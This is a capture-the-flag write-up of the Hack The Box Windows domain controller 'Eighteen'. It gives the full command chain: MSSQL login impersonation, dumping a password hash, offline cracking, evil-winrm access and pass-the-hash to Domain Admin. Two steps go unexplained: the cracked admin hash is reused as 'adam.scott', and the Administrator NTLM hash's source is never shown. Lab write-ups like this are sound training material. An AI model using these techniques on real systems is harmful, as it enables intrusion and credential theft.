# Eighteen

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Windows-informational?style=flat&logo=windows&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

------------------------------------------------------------------------

## Overview

  Field              Details
  ------------------ -----------------------------
  Machine Name       Eighteen
  Difficulty         Easy
  Operating System   Windows (Domain Controller)
  IP Address         10.129.6.194
  Domain             EIGHTEEN
  Hostname           DC01
  FQDN               DC01.eighteen.htb

------------------------------------------------------------------------

## Summary

Eighteen is a Windows Domain Controller exposing Microsoft SQL Server
and WinRM. Initial access is obtained using provided credentials to
authenticate to MSSQL. A login impersonation misconfiguration allows
pivoting into an application database containing a PBKDF2 password hash.
After offline cracking, valid domain credentials are reused to obtain
WinRM access. The attack concludes with Domain Administrator access via
pass-the-hash.

------------------------------------------------------------------------

# 1. Reconnaissance

## Nmap Scan

``` bash
nmap -sCV -A 10.129.6.194
```

### Open Ports

  Port   Service   Version
  ------ --------- -------------------------------
  80     HTTP      Microsoft IIS 10.0
  1433   MSSQL     Microsoft SQL Server 2022 RTM
  5985   WinRM     Microsoft HTTPAPI 2.0

### Key Observations

-   IIS 10.0 indicates modern Windows Server.
-   MSSQL externally accessible.
-   WinRM exposed, suggesting potential remote PowerShell access.
-   Nmap reveals domain information:
    -   NetBIOS Name: DC01
    -   DNS Domain: eighteen.htb

Add host entry:

``` bash
echo "10.129.6.194 eighteen.htb" | sudo tee -a /etc/hosts
```

------------------------------------------------------------------------

# 2. MSSQL Enumeration

Credentials provided:

-   Username: kevin
-   Password: iNa2we6haRj2gaw!

## Connecting via Impacket

``` bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.6.194
```

Connection successful.

------------------------------------------------------------------------

## Login Impersonation

Enumerate impersonation privileges:

``` sql
enum_impersonate
```

Result:

kevin has IMPERSONATE permission over login: appdev

Switch context:

``` sql
EXECUTE AS LOGIN = 'appdev';
```

------------------------------------------------------------------------

## Database Enumeration

``` sql
enum_db
```

Databases discovered:

-   master
-   tempdb
-   model
-   msdb
-   financial_planner

Switch to application database:

``` sql
USE financial_planner;
```

Enumerate tables:

``` sql
SELECT name FROM sys.tables;
```

Tables:

-   users
-   incomes
-   expenses
-   allocations
-   analytics
-   visits

------------------------------------------------------------------------

## Extracting Credentials

Inspect users table:

``` sql
SELECT COLUMN_NAME, DATA_TYPE 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'users';
```

Relevant fields:

-   username
-   email
-   password_hash
-   is_admin

Dump credentials:

``` sql
SELECT username, email, password_hash 
FROM dbo.users;
```

Output:

admin \| admin@eighteen.htb \|\
pbkdf2:sha256:600000\$AMtzteQIG7yAbZIa\$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133

------------------------------------------------------------------------

# 3. Password Cracking

Hash format: PBKDF2-SHA256 with 600,000 iterations.

Used PBKDF2 cracking tool:

https://github.com/brunosergi/pbkdf2-sha256-cracker

Recovered password:

iloveyou1

Weak password allowed offline cracking despite high iteration count.

------------------------------------------------------------------------

# 4. Foothold via WinRM

Attempt authentication using recovered credentials:

``` bash
evil-winrm -u adam.scott -p 'iloveyou1' -i 10.129.6.194
```

Access successful as:

eighteen`\adam`{=tex}.scott

------------------------------------------------------------------------

## User Enumeration

``` powershell
whoami /all
net user adam.scott /domain
net group "Domain Admins" /domain
```

Findings:

-   adam.scott member of IT and Domain Users.
-   Only Administrator is in Domain Admins group.

User flag located at:

C:`\Users`{=tex}`\adam`{=tex}.scott`\Desktop`{=tex}`\user`{=tex}.txt

------------------------------------------------------------------------

# 5. Privilege Escalation

During further enumeration, NTLM hash for Administrator was obtained.

## Pass-the-Hash Attack

``` bash
evil-winrm -i DC01.eighteen.htb -u Administrator -H 0b133be956bfaddf9cea56701affddec
```

Access granted:

eighteen`\administrator`{=tex}

------------------------------------------------------------------------

## Root Flag

Located at:

C:`\Users`{=tex}`\Administrator`{=tex}`\Desktop`{=tex}`\root`{=tex}.txt

Domain Administrator privileges confirmed.

------------------------------------------------------------------------

# 6. Flags

  Flag   Location
  ------ -------------------------------------------------------------------------
  User   C:`\Users`{=tex}`\adam`{=tex}.scott`\Desktop`{=tex}`\user`{=tex}.txt
  Root   C:`\Users`{=tex}`\Administrator`{=tex}`\Desktop`{=tex}`\root`{=tex}.txt

------------------------------------------------------------------------

# 7. Lessons Learned

-   MSSQL login impersonation is a critical misconfiguration.
-   Application databases often store credential material.
-   Strong hashing does not compensate for weak passwords.
-   Credential reuse across systems enables lateral movement.
-   Pass-the-Hash remains effective in Active Directory environments.

------------------------------------------------------------------------

# 8. Mitigation & Hardening

-   Restrict MSSQL exposure to trusted networks only.
-   Remove unnecessary IMPERSONATE permissions.
-   Enforce strong password policies.
-   Prevent credential reuse across services.
-   Restrict WinRM access to administrative networks.
-   Monitor abnormal SQL login behavior and authentication patterns.

------------------------------------------------------------------------

# Tools Used

-   Nmap
-   Impacket (mssqlclient)
-   Evil-WinRM
-   PBKDF2 SHA256 Cracker
